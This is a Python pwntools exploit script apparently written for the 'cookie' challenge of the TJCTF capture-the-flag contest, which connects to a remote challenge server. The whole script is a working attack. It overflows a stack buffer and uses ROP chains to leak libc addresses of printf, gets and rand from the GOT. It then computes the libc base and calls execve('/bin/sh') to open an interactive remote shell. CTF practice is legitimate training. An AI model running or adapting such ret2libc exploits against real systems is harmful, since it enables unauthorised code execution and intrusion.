#!/usr/bin/python

from pwn import *

#p = process("./cookie")

libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
p = remote("p1.tjctf.org", 8010)

elf = ELF("cookie")
p.recvuntil("Which is the most tasty?")


popRdi = p64(0x0000000000400933)
printf_got = p64(elf.got["printf"])
main = p64(0x0000000000400797)
offset = 88


payload = "M"*(offset)+ popRdi + printf_got + p64(elf.plt["puts"]) + main


#gdb.attach(p)
p.sendline(payload)
p.recvline()
p.recvline()

printf_leak =  p.recvline().strip()


printf_leak = u64(printf_leak + "\x00"*(8 - len(printf_leak)))

print "printf @ ", hex(printf_leak)

print "---------------------------"

p.recvuntil("Which is the most tasty?")

payload_2 = "M"*(offset)+ popRdi + p64(elf.got["gets"]) + p64(elf.plt["puts"]) + main


p.sendline(payload_2)


p.recvline() 
p.recvline()

gets_leak =  p.recvline().strip()


gets_leak = u64(gets_leak + "\x00"*(8 - len(gets_leak)))

print "gets @ ", hex(gets_leak)

print "---------------------------"


p.recvuntil("Which is the most tasty?")

payload_3 = "M"*(offset)+ popRdi + p64(elf.got["rand"]) + p64(elf.plt["puts"]) + main


p.sendline(payload_3)


p.recvline() 
p.recvline()

rand_leak =  p.recvline().strip()


rand_leak = u64(rand_leak + "\x00"*(8 - len(rand_leak)))

print "rand @ ", hex(rand_leak)

print "---------------------------"


#gdb.attach(p)

p.recvuntil("Which is the most tasty?")


base_address = printf_leak - libc.symbols["printf"]
binsh = p64(base_address + libc.search("/bin/sh").next())
PopRdxRsi = p64(base_address + 0x00000000001306d9)
execve = p64(base_address + libc.symbols["execve"])
system = p64(base_address + libc.symbols["system"])
ret = p64(0x000000000040061e)

finish_him = "M"*offset + popRdi + binsh + PopRdxRsi + p64(0)*2 + execve

p.sendline(finish_him)

p.interactive()
